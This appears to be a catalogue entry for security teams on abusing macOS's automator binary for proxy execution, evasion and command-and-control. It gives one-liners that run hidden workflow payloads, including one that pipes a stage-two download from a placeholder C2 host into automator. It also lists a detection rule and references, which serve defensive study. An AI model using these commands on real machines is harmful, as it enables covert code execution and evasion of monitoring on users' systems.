name: automator
author: Hare Sudhan (@cyb3rbuff)
short_description: Run an Automator .workflow bundle, including its Run Shell Script, Run AppleScript, and Run JavaScript actions, from the command line.
full_description: >-
  automator runs an Automator .workflow bundle, executing its chain of actions and optionally setting the workflow's
  input and variables for that run. The action set in /System/Library/Automator includes Run Shell Script, Run
  AppleScript, and Run JavaScript, making a workflow bundle a script container whose payload lives in the bundle's
  document.wflow XML. This gives an attacker proxy execution behind a signed Apple binary: the command line carries
  only a document path, and the script runs inside the Automator runtime rather than the invoking shell. The same
  indirection supports persistence, where a LaunchAgent names /usr/bin/automator and a workflow bundle in its
  ProgramArguments and keeps the payload out of the property list.
created: 2026-09-20
example_use_cases:
  - name: Proxy execution of a shell payload held in a workflow bundle
    description: >-
      A .workflow bundle containing a Run Shell Script action runs its commands when the bundle is passed to automator.
      The commands live in the bundle's document.wflow, so only a document path appears on the command line, and the
      Automator runtime starts the shell. The payload runs with the privileges of the invoking user, so no elevation is
      required.
    code: automator /Users/Shared/.cache/update.workflow
    tactics:
      - Execution
      - Defense Evasion
    tags: []
  - name: Pass the payload in over standard input instead of writing it to the workflow
    description: >-
      The -i flag sets the workflow's input, and an argument of "-" makes automator read that input from standard input,
      treating each newline-terminated line as one text input item. A Run Shell Script action whose "Pass input" setting
      is stdin hands that data to the chosen shell. The staged bundle can be a generic harness with no indicators of its
      own, while the attacker-controlled content arrives at run time and is never written to a file.
    code: curl -s https://<C2_HOST>/stage2 | automator -i - /Users/Shared/.cache/harness.workflow
    tactics:
      - Execution
      - Defense Evasion
    tags: []
  - name: Supply attacker-controlled values at run time with workflow variables
    description: >-
      The -D flag sets a named Automator variable for a single run of the workflow. Variables can be dragged onto an
      action's fields, so a workflow built that way holds no host names, URLs, or paths of its own, moving those
      indicators out of the staged bundle and into the invoking command. The variables must already be bound into the
      actions' fields for the supplied values to take effect.
    code: automator -D C2_HOST=<C2_HOST> -D STAGE_PATH=/Users/Shared/.cache/stage2 /Users/Shared/.cache/sync.workflow
    tactics:
      - Execution
      - Defense Evasion
    tags: []
  - name: Retrieve remote content through Automator's own network actions
    description: >-
      Automator ships network actions such as Download URLs and Get Contents of Webpages in /System/Library/Automator.
      A workflow built from those actions performs the fetch inside the Automator runtime, so the outbound connection
      comes from Automator and its com.apple.automator.runner XPC service rather than from curl, nscurl, or a scripting
      interpreter. The URL can be handed in as the workflow input with -i, keeping it out of the bundle.
    code: automator -i https://<C2_HOST>/stage2 /Users/Shared/.cache/fetch.workflow
    tactics:
      - Command and Control
    tags: []
paths:
  - /usr/bin/automator
  - /System/Applications/Automator.app/Contents/MacOS/Automator
detections:
  - name: "Elastic: Suspicious Automator Workflows Execution - an Automator process start followed within 15 seconds by a network connection from its XPC service"
    url: https://github.com/elastic/detection-rules/blob/main/rules/macos/execution_script_via_automator_workflows.toml
resources:
  - name: "automator(1) man page"
    url: https://keith.github.io/xcode-man-pages/automator.1.html
  - name: "Apple Developer: Creating Shell Script Actions - how a shell script action receives input via stdin or as arguments"
    url: https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Articles/ShellScriptActions.html
  - name: "Apple Support: Use variables in Automator on Mac"
    url: https://support.apple.com/guide/automator/use-variables-atmtr15198/mac
  - name: "MITRE ATT&CK T1059.002 - Command and Scripting Interpreter: AppleScript, which names Automator workflows as an execution path"
    url: https://attack.mitre.org/techniques/T1059/002/
  - name: "Red Canary: A bundle of nerves - Automator applets, the Automator Application Stub, and document.wflow"
    url: https://redcanary.com/blog/threat-detection/mac-application-bundles/
